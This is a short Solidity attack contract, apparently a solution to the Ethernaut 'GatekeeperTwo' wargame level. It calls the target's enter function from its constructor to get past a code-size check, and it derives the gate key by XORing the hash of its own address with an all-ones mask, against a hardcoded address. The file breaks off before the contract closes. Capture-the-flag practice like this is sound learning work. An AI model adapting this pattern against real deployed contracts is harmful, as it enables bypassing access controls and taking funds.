pragma solidity ^0.6.0;

interface IGateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeperTwo {
    IGateKeeperTwo public gateKeeperTwo;
    uint64 public x;
    uint64 public mask;
    uint64 public gateKey;

    constructor() public {
        IGateKeeperTwo gateKeeperTwo = IGateKeeperTwo(0xbBf71Ba63d57065dC40e76F72812035Cd490D29F);
        x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        mask = uint64(0) - 1;
        gateKey = x^mask;
        gateKeeperTwo.enter(bytes8(gateKey));
    }